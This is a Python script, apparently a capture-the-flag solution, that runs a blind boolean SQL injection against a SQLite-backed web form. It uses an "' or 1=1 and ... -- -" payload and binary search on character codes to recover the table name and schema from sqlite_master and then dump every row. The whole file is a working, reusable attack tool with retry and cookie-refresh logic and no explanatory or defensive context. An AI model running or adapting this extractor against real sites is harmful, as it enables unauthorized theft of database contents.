import requests
import itertools
import time
import re

"""
CONSTS
"""
COOKIE = ""
URL = "https://web08.webhack.it/"
SQLi_generic = "' or 1=1 and {sub_q} -- -"
verbose = True
SLEEP_TIME = 10


session = requests.Session()
session.cookies.update({"challenge_auth_token": COOKIE})


def get_len_by_query(query)->int:
    bsqli = "("+query+")={length}"
    bsqli = SQLi_generic.format(sub_q = bsqli)
    for i in itertools.count(start=1):
        print(bsqli)
        if true_or_false(bsqli.format(length=i)):
            return i
    


def find_string_by_length_and_query(query_with_indexes: str, length: int)->str:
    bsqli = f"({query_with_indexes})"+"{less_greater}{ascii_char}"
    bsqli = SQLi_generic.format(sub_q = bsqli)
    less = '<'
    greater = '>'
    string=""
    for i in range(1, length+1, 1):
        start=0
        end=177
        mid = (start+end)//2
        while True:  
            this_bsqli=bsqli.format(char_index=i, less_greater=greater, ascii_char=mid)
            if true_or_false(this_bsqli):
                start=mid+1
                mid = (end+start)//2
            else:
                this_bsqli=bsqli.format(char_index=i, less_greater=less, ascii_char=mid)
                if true_or_false(this_bsqli):
                    end=mid-1
                    mid = (end+start)//2
                else:
                    string+=chr(mid)
                    print(f"Found {i} char: ", chr(mid), "\nPartial string: ", string)
                    break
    return string


def parse_columns(s: str)->list[str]:
    s=s.strip()[:-1]
    pattern = re.compile(r"\s*create\stable\s+\w+\s*\(", re.IGNORECASE)
    s=pattern.sub("", s)
    s=s.replace("\n", "")
    if "," not in s:
        s=[s.strip().split(" ")[0]]
    else:
        s=s.split(",")
        s=[column.strip().split(" ")[0] for column in s]
    print("Found these columns ", s)
    return s


def find_current_table_name()->str:
    def len_table():
        bsqli = "SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'"
        return get_len_by_query(bsqli)
    
    def find_table_name_by_lenght(length: int):
        # it starts from 1
        bsqli = "select unicode(substr((SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),{char_index}, {char_index}))"
        return find_string_by_length_and_query(bsqli, length)

    table_len = len_table()
    print("table len: ", table_len)
    table_name = find_table_name_by_lenght(table_len)
    print("table name: ", table_name)
    return table_name


def find_columns(table_name: str)->list[str]:
    bsqli = "SELECT length(sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='{table_name}'".format(table_name=table_name)
    #len_table_schema_sqli = get_len_by_query(bsqli)
    len_table_schema_sqli=168
    print("len table schema: ", len_table_schema_sqli)
    bsqli = "SELECT unicode(substr(sql, {char_index}, {char_index})) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name "+"='{table_name}'".format(table_name=table_name)
    table_schema = find_string_by_length_and_query(bsqli, len_table_schema_sqli)
    if verbose:
        print("table schema: ", table_schema)
    return parse_columns(table_schema)


def dump_table(table_name: str, columns):

    rows_bsqli = "select count(*) from {table_name}".format(table_name=table_name)
    num_rows =  get_len_by_query(rows_bsqli)
    print("Found ", num_rows, " rows")
    partial_rows_bsqli = "select "
    for c in columns:
        if c==columns[-1]:
            partial_rows_bsqli+=f"{c} "
        else:
            partial_rows_bsqli+=f"{c} || ' ' || "

    rows_bsqli_without_limit = f"{partial_rows_bsqli} from {table_name}"
    rows_bsqli = rows_bsqli_without_limit+" limit {index},1"
    rows = []
    for i in range(num_rows):
        row_length_bsqli = "length(("+rows_bsqli.format(index=i)+"))"
        result_length = get_len_by_query(row_length_bsqli)
        if verbose:
            print("length row bsqli: "+row_length_bsqli)
            print("result length: ", result_length)
        sqli = "unicode(substr(("+rows_bsqli.format(index=i)+"), {char_index}, {char_index}))"
        rows.append(find_string_by_length_and_query(sqli, result_length))
    print("Rows: ", rows)





def true_or_false(query)->bool:
    if verbose:
        print("Query: ", query)
    data = {
        "query": query
    }
    try:
        resp = session.post(URL, data=data, allow_redirects=False, timeout=SLEEP_TIME)
    except Exception as e:
        print("Connection error: ", e)
        time.sleep(SLEEP_TIME*2)
        return true_or_false(query)
    try:
        resp.raise_for_status()
        if resp.status_code>=300:
            if "Location" in resp.headers.keys() and "too-many-requests" in resp.headers["Location"]:
                print(f"Sleep for {SLEEP_TIME}s because of too many request")
                time.sleep(SLEEP_TIME)
                return true_or_false(query)
            print(resp.headers)
            raise Exception("Redirect, you must change cookies")
    except Exception as e:
        print(e)
        cookie = input("Cookies Expired. Insert fresh cookie: ")
        session.cookies.update({"challenge_auth_token": cookie})
        return true_or_false(query)
    return "Found" in resp.text



def main():
    table_name = find_current_table_name()
    table_columns = find_columns(table_name)
    dump_table(table_name, table_columns)
    


if __name__ == "__main__":
    main()